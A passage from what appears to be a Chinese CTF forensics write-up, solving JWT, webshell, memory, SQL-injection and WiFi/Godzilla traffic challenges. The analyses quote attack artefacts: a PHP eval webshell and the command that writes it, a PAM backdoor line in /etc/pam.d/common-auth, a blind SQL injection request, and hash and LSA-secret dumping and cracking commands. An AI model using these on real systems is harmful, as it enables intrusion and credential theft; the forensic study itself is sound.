href="https://github.com/RealityNet/kobackupdec">华为手机备份文件解密</a></p></blockquote><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><span style="background:#FFDBBB;">收获：jwt认证、wireshark流量分析看包</span></p><h3 id="📚准备知识"><a href="#📚准备知识" class="headerlink" title="📚准备知识"></a>📚准备知识</h3><ul><li><p>jwt类似cookie，也是一种认证方式，是token的一种</p></li><li><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphdmHnoo7noo7lv7UiLCJpYXQiOjE1MTYyMzkwMjJ9.LLJIkhJs6SVYlzn3n8fThQmhGutjTDI3RURTLtHV4ls</p></li><li><p>JWT包含三个部分： Header头部，Payload负载和Signature签名。由三部分生成token，三部分之间用“.”号做分割。</p></li><li><p>参考</p><ul><li><p>JWT与cookie和token的区别：<a href="https://blog.csdn.net/Cjava_math/article/details/81563871">https://blog.csdn.net/Cjava_math/article/details/81563871</a></p></li><li><p>一分钟带你了解JWT认证！<a href="https://www.cnblogs.com/haha12/p/11796456.html">https://www.cnblogs.com/haha12/p/11796456.html</a></p></li><li><p><a href="https://www.cnblogs.com/aaron911/p/11300062.html">https://www.cnblogs.com/aaron911/p/11300062.html</a></p></li><li><p>JWT在线解密：<a href="https://jwt.io/">https://jwt.io/</a></p></li></ul></li></ul><h3 id="✍解题"><a href="#✍解题" class="headerlink" title="✍解题"></a>✍解题</h3><ul><li><p>2.1该网站使用了<code>___jwt___</code>认证方式。（如有字母请全部使用小写）</p><ul><li>下载附件，打开流量包，直接过滤http包，追踪流，看到token=eyJh…，直接锁定为jwt认证方式（题目专题也是jwt）</li></ul></li><li><p>2.2黑客绕过验证使用的jwt中，id和username是<code>_10087#admin_</code>。（中间使用#号隔开，例如1#admin）</p><ul><li><p>看到POST，追踪http，发现token，解密得到10086#admin，不对，看响应包，说权限不够，登陆失败，继续找</p><p><img src="https://api2.mubu.com/v3/document_image/0df57412-e759-4e46-8ec1-a7ef38ea55f7-11812322.jpg" alt="img"></p></li><li><p>找post的，追踪，搜索token，找到不一样的，发现登陆成功=》10087#admin，【<strong>注意先找大包，时间先后，post</strong>】</p><p><img src="https://api2.mubu.com/v3/document_image/c49414ab-877b-41a5-a92d-b8f2ccbf18f1-11812322.jpg" alt="img"></p></li></ul></li><li><p>2.3黑客获取webshell之后，权限是<code>___root___</code>？</p></li><li><p>2.4黑客上传的恶意文件文件名是<code>__1.c__</code>。(请提交带有文件后缀的文件名，例如x.txt)</p><ul><li><p>==注意筛选post，时间先后！==然后发现echo &gt;1.c，说明恶意代码写入了1.c</p><p><img src="https://api2.mubu.com/v3/document_image/f0ad57f5-27b3-40fc-bb69-3dd8b38de2bc-11812322.jpg" alt="img"></p></li></ul></li><li><p>2.5黑客在服务器上编译的恶意so文件，文件名是<code>__looter.so__</code>。(请提交带有文件后缀的文件名，例如x.so)</p><ul><li><p>继续看时间，post，发现移动1.c并改名了，然后117号包就编译了</p><p><img src="https://api2.mubu.com/v3/document_image/aede6f28-c0b0-4f2f-8c81-751e401d3506-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/62f20a0c-2b92-4fae-9d91-050480cc4e4f-11812322.jpg" alt="img"></p></li><li><p>发现要编译的文件：looter.so</p><img src="https://api2.mubu.com/v3/document_image/1a05340b-1111-4ed9-963a-b1da33c38bc0-11812322.jpg" alt="img" style="zoom: 50%;"></li></ul></li><li><p>2.6黑客在服务器上修改了一个配置文件，文件的绝对路径为<code>__/etc/pam.d/common-auth__</code>。（请确认绝对路径后再提交）</p><ul><li>找、看post包体，command是url编码后的，找到<code>Form item: &quot;command&quot; = &quot;echo &quot;auth optional looter.so&quot;&gt;&gt;/etc/pam.d/common-auth&quot;</code>，恶意文件绝对路径：<code>/etc/pam.d/common-auth</code></li></ul></li></ul><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><span style="background:#FFDBBB;">收获：wireshark检索、权限怎么看、从代理工具frpc看socket5账号密码</span></p><h3 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h3><ul><li><p>ob函数</p><ul><li><p><a href="https://www.cnblogs.com/xuzhengzong/p/7240809.html">PHP详解ob_clean,ob_start和ob_get_contents函数</a></p></li><li><p>start：开始记录要输出的东西，==并且所有输出放缓存区而不是浏览器！==</p></li><li><p>get_contents(); 取出从ob_start()函数开始的地方到这个函数之间所有输出的内容并连在一起</p></li><li><p>⚠注意：start后，在任何时候使用echo ，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。</p></li></ul></li><li><p>try catch ：php异常处理</p><ul><li><p>Exception：异常</p></li><li><p>将要执行的代码放入TRY块中,如果这些代码执行过程中某一条语句发生异常,则程序直接跳转到CATCH块中,由$e收集错误信息和显示</p></li><li><p>参考：<a href="https://www.runoob.com/php/php-exception.html"><strong>PHP 异常处理</strong></a></p></li></ul></li><li><p>php_uname — 返回运行 PHP 的系统的有关信息</p><ul><li>参数没有或为a时默认返回全部信息即操作系统名称、主机名、版本名称、版本信息、机器类型，eg：<code>Linux localhost 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003 i686</code>,而<code>echo PHP_OS</code>只返回Linux</li></ul></li><li><p>substr</p><ul><li>字符串中的第一个字符的索引为 0，第三个参数表示截取长度没有则一直到结尾</li></ul></li><li><p>urldecode(),解码字符串中的 %16进制【url编码就是%+16进制数】</p></li></ul><h3 id="解题✍"><a href="#解题✍" class="headerlink" title="解题✍"></a>解题✍</h3><ul><li><p>3.1黑客登录系统使用的密码是？</p><ul><li>搜索password，在分组详情里，找到password为Admin123!@#</li></ul></li><li><p>3.2黑客修改了一个日志文件，文件的绝对路径为？。（请确认绝对路径后再提交）</p><ul><li>继续找POST，发现日志文件路径data/Runtime/Logs/Home/21_08_07.log</li></ul></li><li><p>3.3黑客获取webshell之后，权限是______？</p><ul><li><p>继续找POST，发现317包有系统命令whoami，<strong>回答经对比发现是在&lt;!DOCUMENT&gt;前default/后,权限是www-data</strong>，【<span style="background:#FF9999;">⚠权限无非一般就是www-data,或者root</span>】</p><p><img src="https://api2.mubu.com/v3/document_image/fd8c652a-92b4-42d3-a258-1c829ab1f177-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/47c95dc1-d440-4d68-9d7b-6b69f7a37fdd-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/0959a132-4a15-4839-a182-28653be2a2de-11812322.jpg" alt="img"></p></li></ul></li><li><p>3.4黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)</p><ul><li><p>发现base64的一句话木马，<code>&lt;?php eval($_REQUEST[aaa]);?&gt;</code>，<code>&quot;aaa&quot; = &quot;system(&#39;echo PDxxxxxxxxxxxxx|base64 -d &gt; /var/www/html/1.php&#39;)&quot;</code>则文件名是1.php</p><p><img src="https://api2.mubu.com/v3/document_image/9d7dc7f0-0f95-46e8-bbfc-ad7309c1ff43-11812322.jpg" alt="img"></p></li></ul></li><li><p>3.5黑客上传的代理工具客户端名字是______frpc_______。（如有字母请全部使用小写）</p><ul><li><p>后分析POST包，代码审计，<strong>substr去掉前两位</strong>base64解密=》L3Zhci93d3cvaHRtbC9mcnBjLmluaQ== =》 /var/www/html/frpc.ini  =》==frpc：为反向代理内网穿透常用工具==，注意：之前的value<code>&amp;j68071301598f=HdL3Zhci93d3cvaHRtbC8=;=&gt;L3Zhci93d3cvaHRtbC8=   =&gt;/var/www/html/</code>无效！</p><ul><li><p>响应包的文件信息，也可以看到代理文件=》frpc</p><img src="https://api2.mubu.com/v3/document_image/3f490319-4495-4d33-ac75-e3c9cdc8e564-11812322.jpg" alt="img" style="zoom:67%;"></li></ul></li></ul></li><li><p>3.6黑客代理工具的回连服务端IP是_____192.168.239.123________。</p></li><li><p>3.7黑客的socks5的连接账号、密码是<code>__0HDFt16cLQJ#JTN276Gp___</code>。（中间使用#号隔开，例如admin#passwd）</p><ul><li><p>代理客户端ip：对上面发现设置代理ini的包下面还有一串参数，16进制转换=》代理地址为192.168.239.123，socket5账号密码：0HDFt16cLQJ#JTN276Gp</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/3e3f505d-9052-43a9-8c4f-8c126076dd70-11812322.jpg" alt="img" style="zoom:50%;"></li></ul></li></ul><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>要点：<span style="background:#FFDBBB;">直接记事本打开，Ctrl+F，搜200</span></p><h2 id="内存分析-❗"><a href="#内存分析-❗" class="headerlink" title="内存分析 ❗"></a><strong>内存分析</strong> ❗</h2><p><span style="background:#FFDBBB;">收获：</span></p><ul><li>volatility内存取证mimikatz爆破密码</li><li>volatility文件扫描检索、dump文件、dump hash表、查看内存信息、注册表、直接提取LSA密码</li><li>华为备份文件还原</li></ul><h3 id="📚准备知识-1"><a href="#📚准备知识-1" class="headerlink" title="📚准备知识"></a>📚准备知识</h3><h4 id="volatility"><a href="#volatility" class="headerlink" title="volatility"></a>volatility</h4><ul><li><p><a href="https://blog.csdn.net/chanyi0040/article/details/100956582">Volatility工具指令篇：</a></p><ul><li><p>volatility -f Target.vmem imageinfo   –查看内存信息</p></li><li><p>volatility -f Target.vmem –profile=Win7SP1x64 hivelist  –查看注册表信息，如所有用户名、密码hash、病毒隐藏、恶意启动项、映射劫持。等</p></li><li><p>volatility -f Target.vmem –profile=Win7SP1x64 hashdump  –获取用户名及密码hash，一行一个用户  【获取特定用户hashdump -y system的偏移量 -s SAM的偏移量】</p></li><li><p>volatility -f Target.vmem –profile=Win7SP1x64 lsadump  –获取最后登录的用户名</p></li></ul></li><li><p>密码爆破神器–Hashcat：<a href="https://www.sqlsec.com/2019/10/hashcat.html%E3%80%90kali%E8%87%AA%E5%B8%A6%E3%80%91">https://www.sqlsec.com/2019/10/hashcat.html【kali自带】</a></p><ul><li><p>-m 接hash类型，默认0：md5。-a指定爆破模式，0：字典爆破</p></li><li><p><code>hashcat64.exe -m 0 -a 0 5ec822debe54b1935f78d9a6ab900a39 password.txt</code>  使用密码字典破解 MD5 哈希</p></li></ul></li><li><p>国外在线hash解密</p><ul><li><a href="https://crackstation.net/">https://crackstation.net/</a></li></ul></li><li><p>华为备份文件解密</p><ul><li><p><a href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p></li><li><p>py -3 kobackupdec.py -vvv 设置的密码  “备份文件存放目录(文件夹)”  解密文件的存放目录 </p></li></ul></li></ul><h3 id="✍解题-1"><a href="#✍解题-1" class="headerlink" title="✍解题"></a>✍解题</h3><p>题目：题目描述:网管小王制作了一个虚拟机文件，让您来分析后作答：</p><h4 id="vol爆破虚拟机密码"><a href="#vol爆破虚拟机密码" class="headerlink" title="vol爆破虚拟机密码"></a>vol爆破虚拟机密码</h4><p>虚拟机的密码是<code>___flag&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;_</code>。（密码中为flag{xxxx}，含有空格，提交时不要去掉）</p><ul><li><p>txt提示no space but underline，没有空格但有下划线</p></li><li><p>先kali对镜像文件获取信息：<code>vol.py -f &#39;Target.vmem&#39; imageinfo</code>，取第一个关键文件Win7SP1x64</p><p><img src="https://api2.mubu.com/v3/document_image/2d2d6a13-e146-44f0-bb27-49fd9b5f7e00-11812322.jpg" alt="img"></p></li><li><p>再用户名密码导出hash<code>vol.py -f &#39;Target.vmem&#39; --profile=Win7SP1x64 hashdump </code></p><ul><li><p>尝试对hash解密，发现没有结果</p><p><img src="https://api2.mubu.com/v3/document_image/4709cc48-538c-4e4a-b459-7d70b39c8496-11812322.jpg" alt="img"></p></li></ul></li><li><p>从注册表转储（解密）LSA 机密<code>vol.py -f &#39;Target.vmem&#39; --profile=Win7SP1x64 lsadump </code>发现flag</p><img src="https://api2.mubu.com/v3/document_image/2e80b0ff-c2b1-41c2-927a-81f8a3d6de56-11812322.jpg" alt="img" style="zoom:67%;"></li><li><p>还可以直接使用minikatz插件获取flag【安装时注意mimikatz里的模块construct版本问题，2.5.5-reupload在<a href="https://mirrors.huaweicloud.com/repository/pypi/simple/construct/">这里下</a>】</p><p><img src="https://api2.mubu.com/v3/document_image/13ec32cf-3597-4af9-817f-85f5e7230826-11812322.jpg" alt="img"></p></li></ul><h4 id="vol导文件-华为手机备份文件取证"><a href="#vol导文件-华为手机备份文件取证" class="headerlink" title="vol导文件+华为手机备份文件取证"></a>vol导文件+华为手机备份文件取证</h4><p>虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为<code>__flag&#123;TH4NK Y0U FOR DECRYPTING MY DATA&#125;__</code>。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉)</p><ul><li><p>第二题先搜下文件，发现好多华为P40相关的文件，都取出来然后用一个华为备份还原的脚本一把梭了</p></li><li><p>文件扫描<code>vol.py -f Target.vmem --profile=Win7SP1x64 filescan </code>看到华为的信息，再筛选<code>vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep &#39;HUAWEI&#39; </code></p><p><img src="https://api2.mubu.com/v3/document_image/8d1e4b50-4ca1-4361-ad4c-af3ca70f7a73-11812322.jpg" alt="img"></p></li><li><p>==由于华为手机助手加密的文件解密时需要依赖整个文件夹中的文件，只有一个images0.tar.enc是不行的。==</p><ul><li><p>在当前目录下导出tar和第一个文件<code>vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007fe72430 -D ./</code>导出文件为.dat文件，<code>vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007d8c7d10 -D ./</code></p><p><img src="https://api2.mubu.com/v3/document_image/e6055238-6bb6-4c98-b12e-fada725a6276-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/f386b2f2-bb53-4b11-978e-519a9d1287fc-11812322.jpg" alt="img"></p></li><li><p>打开dat文件，发现文件夹里面就是我们需要的内容</p></li></ul></li></ul><p><strong>华为备份解密器</strong></p><ul><li><p>方便起见把HUAWEI P40_2021-aa-bb xx.yy.zz更名为in，决定生成在out文件夹里（未创建）</p></li><li><p><code>python3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX ./in ./out </code>【kali运行失败，win成功】</p><p><img src="https://api2.mubu.com/v3/document_image/b758ae8d-5786-4702-931b-dc1adae58061-11812322.jpg" alt="img"></p></li><li><p>打开out文件夹，找到图片，发现flag{TH4NK Y0U FOR DECRYPTING MY DATA}</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/95adb600-2ddb-421b-b414-c180d1fc4470-11812322.jpg" alt="img" style="zoom:67%;"></li></ul><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>记得好像是看日志</p><p><span style="background:#FFDBBB;">要点：注意问库名表名列名时可看字段名前的一条信息，直接一条全弄出来sqli#flag#flag，字段值才需要一个一个字母看<br></span><br><span style="background:#FFDBBB;"><br></span></p><pre><code class="hljs accesslog"><span class="hljs-number">172.17.0.1</span> - - <span class="hljs-string">[01/Sep/2021:01:45:55 +0000]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),2,1)%20=%20&#x27;r&#x27;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">424</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;python-requests/2.26.0&quot;</span></code></pre><h2 id="wifi-❗"><a href="#wifi-❗" class="headerlink" title="wifi ❗"></a><strong>wifi</strong> ❗</h2><p><strong><span style="background:#FFDBBB;">收获：</span></strong></p><ul><li>网卡的GUID与interface</li><li>vol imageinfo+cmdscan+filescan+dumpfile</li><li>wifi密码airdecap-ng破解</li><li>wireshark客户端服务端哥斯拉流量分析+解密应答包</li></ul><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209190857123.png" alt="image-20211209190857123"></p><h3 id="📚准备知识-2"><a href="#📚准备知识-2" class="headerlink" title="📚准备知识"></a>📚准备知识</h3><h4 id="GUID"><a href="#GUID" class="headerlink" title="GUID"></a>GUID</h4><ul><li><p>什么是 GUID？又叫uuid（通用标识符）</p><ul><li><p>全球唯一标识符 (GUID) 是一个字母数字标识符，用于指示产品的唯一性安装。在许多流行软件应用程序（例如 Web 浏览器和媒体播放器）中，都使用 GUID。</p></li><li><p>==GUID 的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”==，其中每个 x 是 0-9 或 a-f 范围内的一个十六进制的数字。例如：6F9619FF-8B86-D011-B42D-00C04FC964FF 即为有效的 GUID 值</p></li><li><p>{CAF53C68-A94C-11D2-BB4A-00C04FA330A6}</p></li></ul></li><li><p>为什么要用GUID？</p><ul><li>世界上的任何两台计算机都不会生成重复的 GUID 值。GUID 主要用于在拥有多个节点、多台计算机的网络或系统中，分配必须具有唯一性的标识符。在 Windows 平台上，GUID 应用非常广泛：注册表、类及接口标识、数据库、甚至自动生成的机器名、目录名等。</li></ul></li></ul><h4 id="kali，vol内存取证"><a href="#kali，vol内存取证" class="headerlink" title="kali，vol内存取证"></a>kali，vol内存取证</h4><ul><li><p>参考：</p><ul><li><p><a href="http://www.atkx.top/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">http://www.atkx.top/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</a></p></li><li><p><a href="https://cjjkkk.github.io/Volatility-WindowsMemoryForensicsAnalysis/">https://cjjkkk.github.io/Volatility-WindowsMemoryForensicsAnalysis/</a></p></li></ul></li><li><p><code>python vol.py -f [image] ‐-profile=[profile][plugin]   </code>其中 -f 后面加的是要取证的文件， –profile 后加的是工具识别出的系统版本， [plugin] 是指使用的插件，其中默认存在一些插件，另外还可以自己下载一些插件扩充。<span style="background:#bbffff;">常见的内存镜像文件有raw、vmem、dmp、img等</span></p></li><li><p><code>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan | grep flag</code> 扫描所有的文件搜索flag</p></li><li><p>imageinfo后一般情况下第一个就是对的:如：Win7SP1x64</p></li></ul><h4 id="WIFI密码"><a href="#WIFI密码" class="headerlink" title="WIFI密码"></a>WIFI密码</h4><ul><li><p><span style="background:#bbffff;">关于系统保存的wifi密码文件地址</span>:如果是Windows Vista或Windows 7，保存在<code>c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\[网卡Guid]</code>，每个无线网络对应一个XML文档</p></li><li><p><span style="background:#FF9999;"><strong>有密码的流量包如何解密wifi？</strong></span></p><ul><li><p>wireshark：成功拿到wifi密码和ssid，233@114514_qwe   My_Wifi，那就可以尝试解密wifi流量包了。<strong>设置方法：编辑-首选项-Protocols-IEEE 802.11-Edit</strong>,设置好后点击ok，就可以看到解密的流量包了</p></li><li><p>或者airdecap-ng工具</p></li></ul></li></ul><h5 id="airdecap-ng"><a href="#airdecap-ng" class="headerlink" title="airdecap-ng"></a>airdecap-ng</h5><ul><li>用于解开加密的WiFi流量包 ，需要知道ssid和pass【SSID（路由器发送的无线信号的名字）】</li><li><code>airdecap-ng -e &lt;Kevin’sWi-FI essid&gt; -p &lt;passwd.txt&gt; 目标.cap</code></li><li><a href="https://www.bilibili.com/read/cv9131435">衍生：三分钟，快速入狱教程，之如何迅速破解WiFi密码</a>  、 <a href="https://www.cnblogs.com/lsdb/p/10075508.html">2</a></li></ul><h4 id="压缩函数"><a href="#压缩函数" class="headerlink" title="压缩函数"></a>压缩函数</h4><p><a href="http://m.w3capi.com/m_doc/chapter/id/105/cid/21.html#sub-198">PHP 字符串各种压缩函数，， gzencode 和 gzdecode</a></p><ul><li><code>gzencode ( string $data [, int $level = -1 [, int $encoding_mode = FORCE_GZIP ]] ) : string  </code>，第二个参数是压缩等级，第三个是编码模式</li></ul><h4 id="哥斯拉木马❗"><a href="#哥斯拉木马❗" class="headerlink" title="哥斯拉木马❗"></a>哥斯拉木马❗</h4><ul><li><p>🔗参考：</p><blockquote><p><a href="https://www.geekby.site/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">涉及哥斯拉3个包分析</a></p><p><a href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析 - FreeBuf网络安全行业 </a></p></blockquote></li><li><p>是与蚁剑、菜刀、冰蝎类似的webshell管理工具，但它流量加密更强大，<strong>可能菜刀、蚁剑、冰蝎的马刚连上就断，最后只有哥斯拉可以正常连接</strong></p><ul><li><p>密码是后门的参数，pass=xxxxx，这种。密钥：key，用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的md5值，然后<strong>取其前16位</strong>用于加密过程，🐖<span style="background:#FF9999;">！密钥与密码不同！</span></p></li><li><p>哥斯拉测试连接，客户端会传三个POST包，wireshark服务器收到三个包的流量</p><ul><li><p>第1个请求会发送<strong>大量数据</strong>，该请求不含有任何Cookie信息，服务器<strong>响应报文不含任何数据</strong>，但是会设置PHPSESSID，后续客户端请求都会自动带上该Cookie</p><ul><li><p>哥斯拉发送的第一个POST请求中，请求数据的<strong>加密过程为</strong>：将原始数据与shell密钥（本例中为test1234）md5值的前16位（本例中为16d7a4fca7442dda）按位异或，再依次经过base64编码和URL编码，得到编码数据，最终以pass=编码数据的形式作为POST报文请求体，POST到服务器。</p></li><li><p>解密过程与加密过程正好相反：从pass=编码数据中提取编码数据，依次经过URL解码和base64解码，再与shell密钥（本例中为test1234）md5值的前16位（本例中为16d7a4fca7442dda）按位异或即可得到原始请求数据。</p></li></ul></li><li><p>第2个请求与第三个请求一样，已经自动带上了第1个请求中服务器响应返回的Cookie值，body只有少量的数据。</p><ul><li>哥斯发送的第2个POST请求实际上是通过调用函数向服务器POST了原始数据的加密包，如果服务器返回值（解密后）为ok，则说明shell测试连接成功。</li></ul></li></ul></li></ul></li><li><p>==shell代码【加解密、流量分析】==</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209192147189.png" alt="image-20211209192147189"></p><ul><li><p>其中比较核心的地方有两处，第一处是进行异或加密和解密的函数encode，第二处是嵌套的两个if对哥斯拉客户端上传的代码做执行并得到结果。根据<code>$data=encode(base64_decode($_POST[$pass]),$key);</code></p></li><li><p>为了使客户端分离出结果，三个echo利用md5值作为分离标志，将得到的代码执行结果进行拼接：</p><ul><li><p>md5($P.$T)前16位</p></li><li><p>结果 -&gt; E函数进行异或加密 -&gt; Base64编码</p></li><li><p>md5($P.$T)后16位</p></li><li><p>==🐖！：哥斯拉输出结果（密文）是会将结果压缩然后加密  =》gzencode =&gt;gzdecode==</p></li></ul></li><li><p>==！则对客户端收到的包解密：去掉body首位16位=》base64解密=》encode，而新版的哥斯拉对流量包压缩了，因此最后还要加上解压函数=》gzdecode==</p><ul><li><strong>即要想解密服务器响应数据，需要去除混淆字符，进行base64解密，再异或，再进行gzip解密。</strong></li></ul></li></ul></li></ul><h3 id="✍解题-2"><a href="#✍解题-2" class="headerlink" title="✍解题"></a>✍解题</h3><p>WP</p><blockquote><ul><li><a href="https://www.nctry.com/2449.html">https://www.nctry.com/2449.html</a></li><li>微信公众号（黑白天实验室）：<a href="http://cn-sec.com/archives/547840.html">http://cn-sec.com/archives/547840.html</a></li><li>魔法少女：<a href="http://www.snowywar.top/?p=2554">http://www.snowywar.top/?p=2554</a></li></ul></blockquote><p>题目</p><ul><li><p>网管小王最近喜欢上了ctf网络安全竞赛，他使用“哥斯拉”木马来玩玩upload-labs，并且<strong>保存了内存镜像、wifi流量和服务器流量</strong>，让您来分析后作答：（本题仅1小问）</p></li><li><p>小王往upload-labs上传木马后进行了<code>cat/flag</code>, flag内容为<code>____flag&#123;5db5b7b0bb74babb66e1522f3a6b1b12&#125;___</code>(压缩包里有解压密码的提示，需要额外添加花括号)</p></li></ul><h4 id="1-取证【镜像里面有什么内容（目的是破解客户端的流量）】"><a href="#1-取证【镜像里面有什么内容（目的是破解客户端的流量）】" class="headerlink" title="1.取证【镜像里面有什么内容（目的是破解客户端的流量）】"></a>1.取证<strong>【镜像里面有什么内容（目的是破解客户端的流量）】</strong></h4><ul><li><p>vol.py -f Windows 7-dde00fa9.vmem  imageinfo ，查看镜像文件</p><p><img src="https://api2.mubu.com/v3/document_image/0f6e9772-460c-48ce-8009-38a92e865c81-11812322.jpg" alt="img"></p></li><li><p><code>vol.py -f Windows 7-dde00fa9.vmem  --profile=Win7SP1x86_23418 cmdscan</code>，搜索四个文件的cmd进程，发现一样的，就按第一个弄，发现cmd里有导出文件的痕迹【后续知道imageinfo后一般情况下第一个就是对的:Win7SP1x64】</p><p><img src="https://api2.mubu.com/v3/document_image/bbaa366e-6ea4-42c7-8098-e709040aec1c-11812322.jpg" alt="img"></p></li><li><p><code>vol.py -f Windows 7-dde00fa9.vmem  --profile=Win7SP1x86_23418 filescan |grep -E &quot;rar|zip&quot;</code>，搜索所有文件，找含zip|rar的，发现可疑文件MY_WIFI.zip，dump下来</p><p><img src="https://api2.mubu.com/v3/document_image/08f041bc-5517-4592-96a5-76ee5188ee68-11812322.jpg" alt="img"></p></li><li><p><code>vol.py -f Windows 7-dde00fa9.vmem  --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003e4b2070 -D ./</code>【-Q是偏移量，-D是导出的文件夹，./意思是导出在当前文件夹、Q在信息的最左边一串数字 】</p><p><img src="https://api2.mubu.com/v3/document_image/8e0303de-749b-4a59-9cb0-f906148b614f-11812322.jpg" alt="img"></p></li><li><p>导出文件为.dat文件，打开发现为加密的xml,🐖==！【密码在描述里，kali下压缩没有描述，所放到win环境里看！注释的描述信息有东西哇，发现密码在网卡的GUID里。==】（password is Network Adapter GUID）</p><p><img src="https://api2.mubu.com/v3/document_image/442e8739-b6af-4ffc-af65-b4458a9cc8b5-11812322.jpg" alt="img"></p></li><li><p><span style="background:#FF9999;">网工人都知道网卡的GUID和接口绑定，上面那位师傅直接grep { 了。我就一条命令完事，直接查接口！</span></p><ul><li><p><code>vol.py -f &#39;Windows 7-dde00fa9.vmem&#39; --profile=Win7SP1x86_23418 filescan | grep &quot;Interfaces&quot;</code>找到guid密码</p><p><img src="https://api2.mubu.com/v3/document_image/341de8d4-0eb9-4492-818c-9f134562c5cd-11812322.jpg" alt="img"></p></li><li><p>也可以按花括号搜索<code>vol.py -f &#39;Windows 7-dde00fa9.vmem&#39; --profile=Win7SP1x86_23418 filescan | grep &quot;&#123;&quot;</code>，结果很多！不如找接口</p></li></ul></li><li><p>解压出来是xml文件，AES、passPhrase、 密码233@114514_qwe，应该是某个加密文件的密码，题目里也只剩下一个东西被加密了，那就是客户端pcap了。</p><p><img src="https://api2.mubu.com/v3/document_image/c1ec4a75-4924-47e1-af97-1ae5462ae181-11812322.jpg" alt="img"></p></li><li><p>分析客户端wifi，发现只有一个wifi，对流量进行解密</p><p><img src="https://api2.mubu.com/v3/document_image/e674d2c4-436a-4e83-b235-010724a23fa4-11812322.jpg" alt="img"></p></li><li><p>用kali自带WiFi工具解密<code>airdecap-ng -e My_Wifi -p 233@114514_qwe  客户端.cap</code> -e 指定目标网络ssid，-p 密码，ssid在pacp里，解码后有新的东西出现，对cap包流量分析</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209193107506.png" alt="image-20211209193107506"></p><ul><li><p><span style="background:#bbffff;">也可用wireshark自带工具解密，设置方法：编辑-首选项-Protocols-IEEE 802.11-Edit,</span>设置好后点击ok就可以看到解密的流量包了</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/5da66504-a615-4db3-97fe-ea4cd042357b-11812322.jpg" alt="img"></p></li></ul></li></ul><h4 id="2-流量分析-哥斯拉解码"><a href="#2-流量分析-哥斯拉解码" class="headerlink" title="2.流量分析+哥斯拉解码"></a>2.流量分析+哥斯拉解码</h4><p>已知小王往 upload-labs 上传木马后进行了 cat /flag，小王在根目录下读取了flag，那么这个flag应该在发出请求后哥斯拉响应的数据中【解密后的客户端】。</p><ul><li><p>现在是需要在客户端获取服务器响应的数据：</p></li><li><p>同样是http协议，过滤下，多跟踪几个数据，进行解密。</p></li><li><p>尝试解密了几个都发现不是flag，发现某个http流，最终成功复现出flag</p></li></ul><ol><li>分析服务器端，过滤http，发现post上传1.php，分析几个post包，追踪，发现有三个小包（==哥斯拉三次流量==，后两包bodybake后都是webshell加密代码，第一个包pass也是，key利用下面的重要函数反解得到包含run、bypass_open_basedir、formatParameter、evalFunc等二十多个功能函数，具备代码执行、文件操作、数据库操作等诸多功能）</li></ol><ul><li><p>🐖==！：得到加密重要函数，这一看就是哥斯拉的马，并且使用了xor_base64的加密器，配置也是默认配置==，密码:pass 密钥:key,也拿到了服务器ip:42.192.84.152 ,所以我们返回到wifi流量包，直接筛选服务器ip的包，找到几个哥斯拉加密的返回包进行解密流量</p><p><img src="https://api2.mubu.com/v3/document_image/e3ed2a28-8417-464a-97fb-3a13f1956ebe-11812322.jpg" alt="img"></p></li><li><p>解密包的代码：（加解密函数因为异或的原因，都是encode），马里的重要函数<code>encode(base64_decode($_POST[$pass]),$key);</code>=》<strong>数据在接收时，<span style="background:#FF9999;">除了采用前 16 位和后 16 为的干扰字符外</span>，内容采用 gzip 压缩编码 + 异或 + base64</strong> =》编写解密代码【<span style="background:#FF9999;">注意要先删除前16位和后16位字符再执行代码</span>】</p><p><img src="https://api2.mubu.com/v3/document_image/9b421c10-5f30-48d7-a86b-15be843cd20d-11812322.jpg" 